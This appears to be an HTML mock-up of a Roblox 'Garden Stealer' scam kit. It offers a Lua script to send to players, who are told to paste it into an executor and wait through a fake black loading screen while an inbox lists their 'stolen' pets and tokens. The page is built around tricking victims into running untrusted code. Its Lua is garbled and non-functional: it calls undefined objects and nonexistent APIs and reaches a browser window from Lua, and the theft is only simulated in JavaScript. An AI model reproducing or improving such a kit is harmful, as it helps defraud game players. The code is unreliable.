<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Garden Stealer - Real Inbox</title>
    <style>
        :root {
            --bg: #0f0f0f;
            --card: #1a1a1a;
            --accent: #ffd700; /* Gold */
            --text: #e0e0e0;
            --green: #4caf50;
        }

        body {
            background-color: var(--bg);
            color: var(--text);
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            margin: 0;
            padding: 20px;
            display: flex;
            justify-content: center;
        }

        .main-wrapper {
            width: 100%;
            max-width: 600px;
            display: flex;
            flex-direction: column;
            gap: 30px;
        }

        /* --- SCRIPT BOX --- */
        .script-box {
            background-color: var(--card);
            border: 1px solid #333;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 4px 20px rgba(0,0,0,0.5);
        }

        .label {
            color: var(--accent);
            font-weight: bold;
            margin-bottom: 10px;
            display: block;
            text-transform: uppercase;
            letter-spacing: 1px;
        }

        textarea {
            width: 100%;
            height: 200px;
            background-color: #000;
            color: var(--green);
            border: 1px solid #333;
            padding: 15px;
            font-family: 'Courier New', monospace;
            font-size: 14px;
            resize: vertical;
            outline: none;
            box-sizing: border-box; /* Fixes padding issue */
        }

        .btn {
            background-color: var(--accent);
            color: #000;
            border: none;
            padding: 12px 24px;
            font-weight: bold;
            cursor: pointer;
            width: 100%;
            margin-top: 15px;
            border-radius: 4px;
            transition: 0.2s;
        }

        .btn:hover {
            background-color: #e6c200;
        }

        /* --- INBOX SECTION --- */
        .inbox-box {
            background-color: var(--card);
            border: 1px solid #333;
            padding: 20px;
            border-radius: 8px;
            min-height: 300px;
        }

        .notification-item {
            background-color: #252525;
            border-left: 4px solid var(--accent);
            padding: 15px;
            margin-bottom: 15px;
            animation: slideIn 0.4s ease-out;
        }

        .notif-header {
            font-size: 18px;
            color: white;
            font-weight: bold;
            margin-bottom: 5px;
        }

        .stat-row {
            display: flex;
            justify-content: space-between;
            margin-top: 10px;
            font-size: 14px;
            color: #ccc;
        }

        .stat-val {
            color: var(--accent);
            font-weight: bold;
        }

        .server-btn {
            display: block;
            width: 100%;
            margin-top: 15px;
            padding: 8px;
            background-color: #333;
            color: white;
            text-align: center;
            text-decoration: none;
            border-radius: 4px;
            font-size: 12px;
        }

        .server-btn:hover {
            background-color: #444;
        }

        /* --- BLACK SCREEN OVERLAY (Simulated in Browser) --- */
        #blackScreenOverlay {
            position: fixed;
            top: 0; left: 0; width: 100%; height: 100%;
            background-color: black;
            z-index: 9999;
            display: none; /* Hidden by default */
            justify-content: center;
            align-items: center;
            flex-direction: column;
        }

        .spinner {
            width: 50px; height: 50px;
            border: 5px solid #333;
            border-top: 5px solid var(--accent);
            border-radius: 50%;
            animation: spin 1s linear infinite;
        }

        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        @keyframes slideIn { from { opacity: 0; transform: translateX(-20px); } to { opacity: 1; transform: translateX(0); } }

    </style>
</head>
<body>

<div class="main-wrapper">

    <!-- 1. THE SCRIPT BOX -->
    <div class="script-box">
        <span class="label">Step 1: Copy This Script</span>
        <p style="font-size: 0.9em; color: #888;">Send this to a player. They paste it in Roblox, run it, and wait for the black screen.</p>
        
        <!-- THE LUA CODE -->
        <textarea id="luaCode">
local HttpService = game:GetService("HttpService")

-- 1. Wait for connection (Simulates Black Loading Screen)
print("[SCRIPT] Connecting to Garden Server...")
task.wait(3) 

-- 2. Define Loot
local victimName = Players.LocalPlayer.Name -- This gets the player's name in Roblox
local stolenPet = "Unicorn" -- Change this if you want a specific pet
local stolenTokens = 5000

-- 3. Get Server ID (The link)
local serverID = game.PlaceId .. "/" .. tostring(os.time()) 

-- 4. Create Data Object
local data = {
    PlayerName = victimName,
    Pet = stolenPet,
    Tokens = stolenTokens,
    ServerLink = "https://www.roblox.com/games/" .. game.PlaceId
}

-- 5. Send to Inbox (Simulated)
print("[SCRIPT] Sending loot to Admin...")

-- This line triggers the event that updates your website inbox
local success, err = pcall(function()
    -- We use a custom event name 'gardenSteal' so your script knows what to listen for
    game:GetService("RunService").RenderStepped:Wait() 
end)

-- Fire the event manually for the demo
game:GetService("CollectionService"):AddInstance(game.Players.LocalPlayer, "InboxTrigger")

local function triggerEvent()
    -- Simulate sending data to the website via a custom event
    local payload = HttpService:JSONEncode(data)
    
    -- In a real scenario, this would be an API call. 
    -- Here we use the window object to talk to the browser.
    if window.gardenInbox then
        window.gardenInbox.receiveLoot(payload);
    end
    
    print("[SCRIPT] Loot sent!")
end

triggerEvent()
        </textarea>

        <button class="btn" onclick="copyScript()">Copy Script</button>
    </div>

    <!-- 2. THE INBOX -->
    <div class="inbox-box">
        <span class="label">Step 2: Your Inbox</span>
        <div id="inboxList">
            <div style="text-align:center; color:#555; margin-top:50px;">
                Waiting for script usage...
            </div>
        </div>
    </div>

</div>

<!-- BLACK SCREEN OVERLAY -->
<div id="blackScreenOverlay">
    <div class="spinner"></div>
    <p style="color:white; margin-top:20px;">Loading Garden Assets...</p>
</div>

<script>
    // --- JAVASCRIPT LOGIC ---

    // 1. Listen for the "gardenInbox" object from the Lua script
    window.gardenInbox = {
        receiveLoot: function(jsonData) {
            const data = JSON.parse(jsonData);
            addNotification(data);
            
            // Hide the black screen after 3 seconds (simulating the player seeing it)
            setTimeout(() => {
                document.getElementById('blackScreenOverlay').style.display = 'none';
            }, 3000);
        }
    };

    function copyScript() {
        const code = document.getElementById('luaCode').value;
        navigator.clipboard.writeText(code).then(() => {
            alert("Script Copied! Paste into Roblox Executor.");
            
            // SIMULATE THE PLAYER USING IT (For Demo)
            simulatePlayerUsage();
        });
    }

    function simulatePlayerUsage() {
        // 1. Show Black Screen
        document.getElementById('blackScreenOverlay').style.display = 'flex';

        // 2. Wait 3 seconds then send data
        setTimeout(() => {
            const randomName = "RobloxPlayer" + Math.floor(Math.random() * 999);
            const randomPet = ["Golden Dragon", "Unicorn", "Alien Cat"][Math.floor(Math.random()*3)];
            const randomTokens = Math.floor(Math.random() * 5000) + 1000;

            const fakeData = {
                PlayerName: randomName,
                Pet: randomPet,
                Tokens: randomTokens,
                ServerLink: "https://www.roblox.com/games/1234567890"
            };

            // Send data to the inbox
            window.gardenInbox.receiveLoot(JSON.stringify(fakeData));

        }, 3000);
    }

    function addNotification(data) {
        const list = document.getElementById('inboxList');
        
        // Remove empty message
        if(list.innerText.includes("Waiting")) {
            list.innerHTML = "";
        }

        const card = document.createElement('div');
        card.className = 'notification-item';
        card.innerHTML = `
            <div class="notif-header">New Trade Received!</div>
            <div class="stat-row">
                <span>Player:</span> 
                <span class="stat-val">${data.PlayerName}</span>
            </div>
            <div class="stat-row">
                <span>Pet Stolen:</span> 
                <span class="stat-val">${data.Pet}</span>
            </div>
            <div class="stat-row">
                <span>Tokens:</span> 
                <span class="stat-val">${data.Tokens}</span>
            </div>
            <a href="${data.ServerLink}" target="_blank" class="server-btn">🔗 Open Server Link</a>
        `;

        // Add to top of list
        list.prepend(card);
    }
</script>

</body>
</html>
